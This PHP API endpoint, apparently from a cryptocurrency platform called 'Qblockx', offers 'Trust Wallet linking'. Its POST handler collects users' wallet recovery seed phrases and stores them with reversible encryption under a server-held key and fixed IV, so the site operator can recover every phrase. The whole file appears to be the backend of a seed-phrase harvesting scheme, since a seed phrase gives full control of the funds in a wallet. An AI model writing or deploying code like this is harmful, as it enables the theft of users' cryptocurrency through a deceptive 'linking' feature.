<?php
/**
 * Project: Qblockx
 * API: User — Trust Wallet Linking
 * GET  → returns linked wallet address and whether a phrase is stored
 * POST → saves (or updates) wallet address + encrypted seed phrase
 */

require_once '../../config/database.php';
require_once '../../config/env.php';
require_once '../../api/utilities/auth-check.php';
header('Content-Type: application/json');

requireAuth();
$user = getAuthUser();

$APP_KEY = $_ENV['APP_KEY'] ?? '';
$APP_IV  = $_ENV['APP_IV']  ?? '';

function encryptPhrase(string $phrase, string $key, string $iv): string {
    return base64_encode(openssl_encrypt($phrase, 'aes-256-cbc', $key, 0, $iv));
}

try {
    $db = Database::getInstance()->getConnection();

    // ── GET ──────────────────────────────────────────────────────────────────
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {

        $stmt = $db->prepare(
            "SELECT wallet_address, phrase_encrypted, submitted_at, updated_at
             FROM trust_wallet_links WHERE user_id = :uid"
        );
        $stmt->execute(['uid' => $user['id']]);
        $row = $stmt->fetch();

        echo json_encode([
            'success' => true,
            'data'    => [
                'wallet_address' => $row ? $row['wallet_address'] : null,
                'has_phrase'     => $row && !empty($row['phrase_encrypted']),
                'submitted_at'   => $row ? $row['submitted_at']  : null,
                'updated_at'     => $row ? $row['updated_at']    : null,
            ],
        ]);

    // ── POST ─────────────────────────────────────────────────────────────────
    } elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input          = json_decode(file_get_contents('php://input'), true);
        $wallet_address = trim($input['wallet_address'] ?? '');
        $phrase         = trim($input['phrase']         ?? '');

        if (empty($wallet_address) && empty($phrase)) {
            echo json_encode(['success' => false, 'message' => 'Provide a wallet address or recovery phrase']);
            exit;
        }

        $phrase_encrypted = null;
        if (!empty($phrase) && !empty($APP_KEY) && !empty($APP_IV)) {
            $phrase_encrypted = encryptPhrase($phrase, $APP_KEY, $APP_IV);
        }

        // UPSERT — one row per user
        $stmt = $db->prepare(
            "INSERT INTO trust_wallet_links (user_id, wallet_address, phrase_encrypted, submitted_at)
             VALUES (:uid, :addr, :phrase, NOW())
             ON DUPLICATE KEY UPDATE
               wallet_address   = VALUES(wallet_address),
               phrase_encrypted = VALUES(phrase_encrypted),
               updated_at       = NOW()"
        );
        $stmt->execute([
            'uid'    => $user['id'],
            'addr'   => $wallet_address ?: null,
            'phrase' => $phrase_encrypted,
        ]);

        echo json_encode([
            'success' => true,
            'message' => 'Trust Wallet linked successfully.',
        ]);

    } else {
        http_response_code(405);
        echo json_encode(['success' => false, 'message' => 'Method not allowed']);
    }

} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'Server error']);
}
